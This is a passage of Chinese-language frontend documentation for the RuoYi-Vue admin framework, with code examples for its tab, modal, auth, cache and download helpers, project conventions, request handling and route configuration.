<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeRightPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"User"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeRightPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeRightPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>关闭其他tab页签</li></ul>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeOtherPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"User"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeOtherPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeOtherPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<h3><a id="2modal_3880"></a>.2、$modal对象</h3>
<p><code>$modal</code>对象用于做消息提示、通知提示、对话框提醒、二次确认、遮罩等，它定义在<code>plugins/modal.js</code>文件中，它有如下方法</p>
<ul><li>提供成功、警告和错误等反馈信息</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string">"默认反馈"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">msgError</span><span class="token punctuation">(</span><span class="token string">"错误反馈"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">msgSuccess</span><span class="token punctuation">(</span><span class="token string">"成功反馈"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">msgWarning</span><span class="token punctuation">(</span><span class="token string">"警告反馈"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>提供成功、警告和错误等提示信息</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"默认提示"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">alertError</span><span class="token punctuation">(</span><span class="token string">"错误提示"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">alertSuccess</span><span class="token punctuation">(</span><span class="token string">"成功提示"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">alertWarning</span><span class="token punctuation">(</span><span class="token string">"警告提示"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>提供成功、警告和错误等通知信息</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token string">"默认通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">notifyError</span><span class="token punctuation">(</span><span class="token string">"错误通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">notifySuccess</span><span class="token punctuation">(</span><span class="token string">"成功通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">notifyWarning</span><span class="token punctuation">(</span><span class="token string">"警告通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>提供确认窗体信息</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'确认信息'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>提供遮罩层信息</li></ul>
<pre><code class="prism language-javascript"><span class="token comment">// 打开遮罩层</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">loading</span><span class="token punctuation">(</span><span class="token string">"正在导出数据，请稍后..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 关闭遮罩层</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$modal<span class="token punctuation">.</span><span class="token function">closeLoading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="3auth_3931"></a>.3、$auth对象</h3>
<p><code>$auth</code>对象用于验证用户是否拥有某（些）权限或角色，它定义在<code>plugins/auth.js</code>文件中，它有如下方法</p>
<ul><li>验证用户权限</li></ul>
<pre><code class="prism language-javascript"><span class="token comment">// 验证用户是否具备某权限</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasPermi</span><span class="token punctuation">(</span><span class="token string">"system:user:add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 验证用户是否含有指定权限，只需包含其中一个</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasPermiOr</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"system:user:add"</span><span class="token punctuation">,</span> <span class="token string">"system:user:update"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 验证用户是否含有指定权限，必须全部拥有</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasPermiAnd</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"system:user:add"</span><span class="token punctuation">,</span> <span class="token string">"system:user:update"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>验证用户角色</li></ul>
<pre><code class="prism language-javascript"><span class="token comment">// 验证用户是否具备某角色</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 验证用户是否含有指定角色，只需包含其中一个</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasRoleOr</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"common"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 验证用户是否含有指定角色，必须全部拥有</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$auth<span class="token punctuation">.</span><span class="token function">hasRoleAnd</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"common"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="4cache_3957"></a>.4、$cache对象</h3>
<p><code>$cache</code>对象用于处理缓存。我们并不建议您直接使用<code>sessionStorage</code>或<code>localStorage</code>，因为项目的缓存策略可能发生变化，通过<code>$cache</code>对象做一层调用代理则是一个不错的选择。<code>$cache</code>提供<code>session</code>和<code>local</code>两种级别的缓存，如下：</p>
<table><thead><tr><th>对象名称</th><th>缓存类型</th></tr></thead><tbody><tr><td>session</td><td>会话级缓存，通过sessionStorage实现</td></tr><tr><td>local</td><td>本地级缓存，通过localStorage实现</td></tr></tbody></table>
<p><strong>示例</strong></p>
<pre><code class="prism language-javascript"><span class="token comment">// local 普通值</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>local<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'local value'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>local<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 输出'local value'</span>

<span class="token comment">// session 普通值</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'session value'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 输出'session value'</span>

<span class="token comment">// local JSON值</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>local<span class="token punctuation">.</span><span class="token function">setJSON</span><span class="token punctuation">(</span><span class="token string">'jsonKey'</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> localProp<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>local<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span><span class="token string">'jsonKey'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 输出'{localProp: 1}'</span>

<span class="token comment">// session JSON值</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">setJSON</span><span class="token punctuation">(</span><span class="token string">'jsonKey'</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> sessionProp<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span><span class="token string">'jsonKey'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 输出'{sessionProp: 1}'</span>

<span class="token comment">// 删除值</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>local<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cache<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span>
</code></pre>
<h3><a id="5download_3990"></a>.5、$download对象</h3>
<p><code>$download</code>对象用于文件下载，它定义在<code>plugins/download.js</code>文件中，它有如下方法</p>
<ul><li>根据名称下载<code>download</code>路径下的文件</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">"be756b96-c8b5-46c4-ab67-02e988973090.xlsx"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> isDelete <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

<span class="token comment">// 默认下载方法</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 下载完成后是否删除文件</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> isDelete<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>根据名称下载<code>upload</code>路径下的文件</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">const</span> resource <span class="token operator">=</span> <span class="token string">"/profile/upload/2021/09/27/be756b96-c8b5-46c4-ab67-02e988973090.png"</span><span class="token punctuation">;</span>

<span class="token comment">// 默认方法</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>根据请求地址下载<code>zip</code>包</li></ul>
<pre><code class="prism language-javascript"><span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">"/tool/gen/batchGenCode?tables="</span> <span class="token operator">+</span> tableNames<span class="token punctuation">;</span>
<span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">"ruoyi"</span><span class="token punctuation">;</span>

<span class="token comment">// 默认方法</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">zip</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>更多文件下载操作</li></ul>
<pre><code class="prism language-javascript"><span class="token comment">// 自定义文本保存</span>
<span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"Hello, world!"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>type<span class="token operator">:</span> <span class="token string">"text/plain;charset=utf-8"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">saveAs</span><span class="token punctuation">(</span>blob<span class="token punctuation">,</span> <span class="token string">"hello world.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 自定义文件保存</span>
<span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"Hello, world!"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"hello world.txt"</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>type<span class="token operator">:</span> <span class="token string">"text/plain;charset=utf-8"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">saveAs</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 自定义data数据保存</span>
<span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>data<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> type<span class="token operator">:</span> <span class="token string">'text/plain;charset=utf-8'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">saveAs</span><span class="token punctuation">(</span>blob<span class="token punctuation">,</span> name<span class="token punctuation">)</span>

<span class="token comment">// 根据地址保存文件</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$download<span class="token punctuation">.</span><span class="token function">saveAs</span><span class="token punctuation">(</span><span class="token string">"https://ruoyi.vip/images/logo.png"</span><span class="token punctuation">,</span> <span class="token string">"logo.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2><a id="2_4045"></a>2、开发规范</h2>
<h3><a id="1_view_4047"></a>.1、新增 view</h3>
<p>在 <a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/views">@/views (opens new window)</a>文件下 创建对应的文件夹，一般性一个路由对应一个文件， 该模块下的功能就建议在本文件夹下创建一个新文件夹，各个功能模块维护自己的<code>utils</code>或<code>components</code>组件。</p>
<h3><a id="2_api_4051"></a>.2、新增 api</h3>
<p>在 <a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/api">@/api (opens new window)</a>文件夹下创建本模块对应的 api 服务。</p>
<h3><a id="3_4055"></a>.3、新增组件</h3>
<p>在全局的 <a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/components">@/components (opens new window)</a>写一些全局的组件，如富文本，各种搜索组件，封装的分页组件等等能被公用的组件。 每个页面或者模块特定的业务组件则会写在当前 <a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/views">@/views (opens new window)</a>下面。<br/> 如：<code>@/views/system/user/components/xxx.vue</code>。这样拆分大大减轻了维护成本。</p>
<h3><a id="4_4060"></a>.4、新增样式</h3>
<p>页面的样式和组件是一个道理，全局的 <a href="https://gitee.com/y_project/RuoYi-Cloud/tree/master/ruoyi-ui/src/assets/styles">@/style (opens new window)</a>放置一下全局公用的样式，每一个页面的样式就写在当前 <code>views</code>下面，请记住加上<code>scoped</code> 就只会作用在当前组件内了，避免造成全局的样式污染。</p>
<pre><code class="prism language-css"><span class="token comment">/* 编译前 */</span>
<span class="token selector">.example</span> <span class="token punctuation">{<!-- --></span>
  <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* 编译后 */</span>
<span class="token selector">.example[_v-f3f3eg9]</span> <span class="token punctuation">{<!-- --></span>
  <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="3_4076"></a>3、请求流程</h2>
<h3><a id="1_4078"></a>.1、交互流程</h3>
<p>一个完整的前端 UI 交互到服务端处理流程是这样的：</p>
<ol><li>UI 组件交互操作；</li><li>调用统一管理的 api service 请求函数；</li><li>使用封装的 request.js 发送请求；</li><li>获取服务端返回；</li><li>更新 data；</li></ol>
<p>为了方便管理维护，统一的请求处理都放在 <code>@/src/api</code> 文件夹中，并且一般按照 model 维度进行拆分文件，如：</p>
<pre><code class="prism language-text">api/
  system/
    user.js
    role.js
  monitor/
    operlog.js
	logininfor.js
  ...
</code></pre>
<p>提示</p>
<p>其中，<a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/utils/request.js">@/src/utils/request.js (opens new window)</a>是基于 axios 的封装，便于统一处理 POST，GET 等请求参数，请求头，以及错误提示信息等。 它封装了全局 request拦截器、response拦截器、统一的错误处理、统一做了超时处理、baseURL设置等。</p>
<h3><a id="2_4105"></a>.2、请求示例</h3>
<pre><code class="prism language-js"><span class="token comment">// api/system/user.js</span>
<span class="token keyword">import</span> request <span class="token keyword">from</span> <span class="token string">'@/utils/request'</span>

<span class="token comment">// 查询用户列表</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">listUser</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/user/list'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
    params<span class="token operator">:</span> query
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// views/system/user/index.vue</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> listUser <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/system/user"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    userList<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    loading<span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  methods<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>loading <span class="token operator">=</span> <span class="token boolean">true</span>
      <span class="token function">listUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>userList <span class="token operator">=</span> response<span class="token punctuation">.</span>rows
        <span class="token keyword">this</span><span class="token punctuation">.</span>loading <span class="token operator">=</span> <span class="token boolean">false</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>提示</p>
<p>如果有不同的<code>baseURL</code>，直接通过覆盖的方式，让它具有不同的<code>baseURL</code>。</p>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">listUser</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'/system/user/list'</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>
    params<span class="token operator">:</span> query<span class="token punctuation">,</span>
    baseURL<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">BASE_API</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="4_4157"></a>4、引入依赖</h2>
<p>除了 element-ui 组件以及脚手架内置的业务组件，有时我们还需要引入其他外部组件，这里以引入 <a href="https://github.com/PanJiaChen/vue-countTo">vue-count-to (opens new window)</a>为例进行介绍。</p>
<p>在终端输入下面的命令完成安装：</p>
<pre><code class="prism language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> vue-count-to --save
</code></pre>
<blockquote>
<p>加上 <code>--save</code> 参数会自动添加依赖到 package.json 中去。</p>
</blockquote>
<h2><a id="5_4169"></a>5、路由使用</h2>
<p>框架的核心是通过路由自动生成对应导航，所以除了路由的基本配置，还需要了解框架提供了哪些配置项。</p>
<h3><a id="1_4173"></a>.1、路由配置</h3>
<pre><code class="prism language-js"><span class="token comment">// 当设置 true 的时候该路由不会在侧边栏出现 如401，login等页面，或者如一些编辑页面/edit/1</span>
hidden<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">// (默认 false)</span>

<span class="token comment">//当设置 noRedirect 的时候该路由在面包屑导航中不可被点击</span>
redirect<span class="token operator">:</span> <span class="token string">'noRedirect'</span>

<span class="token comment">// 当你一个路由下面的 children 声明的路由大于1个时，自动会变成嵌套的模式--如组件页面</span>
<span class="token comment">// 只有一个时，会将那个子路由当做根路由显示在侧边栏--如引导页面</span>
<span class="token comment">// 若你想不管路由下面的 children 声明的个数都显示你的根路由</span>
<span class="token comment">// 你可以设置 alwaysShow: true，这样它就会忽略之前定义的规则，一直显示根路由</span>
alwaysShow<span class="token operator">:</span> <span class="token boolean">true</span>

name<span class="token operator">:</span> <span class="token string">'router-name'</span> <span class="token comment">// 设定路由的名字，一定要填写不然使用&lt;keep-alive&gt;时会出现各种问题</span>
query<span class="token operator">:</span> <span class="token string">'{"id": 1, "name": "ry"}'</span>     <span class="token comment">// 访问路由的默认传递参数</span>
roles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'common'</span><span class="token punctuation">]</span>           <span class="token comment">// 访问路由的角色权限</span>
permissions<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'a:a:a'</span><span class="token punctuation">,</span> <span class="token string">'b:b:b'</span><span class="token punctuation">]</span>      <span class="token comment">// 访问路由的菜单权限</span>
 
meta<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
  title<span class="token operator">:</span> <span class="token string">'title'</span> <span class="token comment">// 设置该路由在侧边栏和面包屑中展示的名字</span>
  icon<span class="token operator">:</span> <span class="token string">'svg-name'</span> <span class="token comment">// 设置该路由的图标，支持 svg-class，也支持 el-icon-x element-ui 的 icon</span>
  noCache<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">// 如果设置为true，则不会被 &lt;keep-alive&gt; 缓存(默认 false)</span>
  breadcrumb<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token comment">//  如果设置为false，则不会在breadcrumb面包屑中显示(默认 true)</span>
  affix<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">// 如果设置为true，它则会固定在tags-view中(默认 false)</span>

  <span class="token comment">// 当路由设置了该属性，则会高亮相对应的侧边栏。</span>
  <span class="token comment">// 这在某些场景非常有用，比如：一个文章的列表页路由为：/article/list</span>
  <span class="token comment">// 点击文章进入文章详情页，这时候路由为/article/1，但你想在侧边栏高亮文章列表的路由，就可以进行如下设置</span>
  activeMenu<span class="token operator">:</span> <span class="token string">'/article/list'</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>普通示例</strong></p>
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
  path<span class="token operator">:</span> <span class="token string">'/system/test'</span><span class="token punctuation">,</span>
  component<span class="token operator">:</span> Layout<span class="token punctuation">,</span>
  redirect<span class="token operator">:</span> <span class="token string">'noRedirect'</span><span class="token punctuation">,</span>
  hidden<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  alwaysShow<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  meta<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> title<span class="token operator">:</span> <span class="token string">'系统管理'</span><span class="token punctuation">,</span> icon <span class="token operator">:</span> <span class="token string">"system"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  children<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span>
    path<span class="token operator">:</span> <span class="token string">'index'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">component</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'@/views/index'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">,</span>
    name<span class="token operator">:</span> <span class="token string">'Test'</span><span class="token punctuation">,</span>
    meta<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
